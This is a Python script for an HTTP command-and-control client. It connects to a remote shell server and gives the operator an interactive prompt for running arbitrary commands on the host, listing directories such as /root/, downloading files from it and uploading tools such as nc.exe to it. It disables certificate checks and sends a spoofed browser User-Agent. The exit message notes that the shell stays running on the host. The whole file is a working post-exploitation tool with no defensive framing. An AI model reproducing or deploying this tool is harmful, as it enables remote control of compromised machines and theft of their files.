#!/usr/bin/python
import requests, logging
from SimpleHTTPServer import SimpleHTTPRequestHandler
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import requests, argparse
from urllib import quote, unquote
from sys import argv, exit
import sys


class HTTPC2:
    def __init__(
            self,
            target,
            redirect=False,
            proxy_address='',
            ip_address=''
    ):
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        self.session = requests.session()
        self.redirect = redirect
        self.ip_address = ip_address
        self.target = target
        self.timeout = 0.5
        self.shell = None
        self.server = None
        self.proxies = {
            'http': 'http://%s' % proxy_address,
            'https': 'http://%s' % proxy_address
        } \
            if proxy_address is not None \
               and proxy_address != '' else {}
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'RequestVerificationToken': '',
            'Connection': 'Keep-Alive'
        }
        self.query_params = {}
        self.form_values = {}
        self.cookies = {}

    def do_get(self, url, params=None, data=None):
        print('executing get request')
        return self.session.get(
            url=url,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            data=data,
            params=params
        )
        # self.session.get().elapsed.total_seconds()

    def do_post(self, url, data=None, params=None):
        print('executing post request')
        return self.session.post(
            url=url,
            data=data,
            verify=False,
            allow_redirects=self.redirect,
            headers=self.headers,
            cookies=self.cookies,
            proxies=self.proxies,
            params=params
        )

    # self.session.get().elapsed.total_seconds()

    def debug(self):
        try:
            import http.client as http_client
        except ImportError:
            import httplib as http_client
        http_client.HTTPConnection.debuglevel = 1
        logging.basicConfig()
        logging.getLogger().setLevel(logging.DEBUG)
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.setLevel(logging.DEBUG)
        requests_log.propagate = True
        return self

    def run_command(self, command):
        print('running command %s' % command)
        url = '%s/CMD/ARGS/run_command' % self.target
        response = self.do_post(url=url, data=command)
        print(response.content)
        return self

    def list_directory(self, file_path):
        url = '%s/CMD/ARGS/list_directory%s' % (self.target, file_path)
        response = self.do_get(url=url)
        print(response.content)
        return self

    def download_file(self, file_path, destination):
        url = '%s/CMD/ARGS/download_file%s' % (self.target, file_path)
        response = self.do_get(url=url)
        open(destination, 'wb').write(response.content)
        print(response.status_code)
        return self

    def upload_file(self, file_path, destination):
        url = '%s/CMD/ARGS/upload_file%s' % (self.target, destination)
        response = self.do_post(url=url, data=open(file_path, 'rb').read())
        print(response.status_code)
        return self

    def run_shell(self):
        print('Connecting to %s' % self.target)
        while 1:
            sys.stdout.write('#')
            cmd = sys.stdin.readline()
            cmd = cmd.strip()
            if cmd == 'exit':
                print('Exiting client (shell still running on host)')
                return
            elif 'list_directory' in cmd:
                self.list_directory(cmd.split(' ')[-1])
            elif 'download_file' in cmd:
                source, dest = cmd.split(' ')[1], cmd.split(' ')[-1]
                self.download_file(source, dest)
            elif 'upload_file' in cmd:
                source, dest = cmd.split(' ')[1], cmd.split(' ')[-1]
                self.upload_file(source, dest)
            else:
                self.run_command(cmd)


if __name__ == '__main__':
    msg = 'Commands/Usage: \n\n'
    msg += 'Upload file: upload_file /tmp/nc.exe /tmp/nc.exe\n'
    msg += 'Download file: download_file /tmp/nc.exe /tmp/nc.exe\n'
    msg += 'List directory: list_directory /root/\n'
    msg += 'Authenticate (just type password): P@ssword\n'
    parser = argparse.ArgumentParser(add_help=True, description='HTTP shell')
    try:
        parser.add_argument('-ip', default='127.0.0.1', action='store', help='IP address of shell server')
        parser.add_argument('-port', default='443', action='store', help='Port to host HTTP on (optional)')
        parser.add_argument('-password', default='', action='store', help='Require password (optional)')
        parser.add_argument('-encrypt', default='', action='store', help='Use encryption with this certificate (optional)')

        if len(sys.argv) == 1:
            parser.print_help()
            print(msg)
            sys.exit(1)

        parser.print_help()
        print(msg)
        options = parser.parse_args()
        target = '%s:%s' % (options.ip, options.port)
        if options.encrypt != '':
            target = 'https://%s' % target
        else:
            target = 'http://%s' % target
        shell = HTTPC2(target=target)
        shell.run_shell()
    except Exception as err:
        print(str(err))
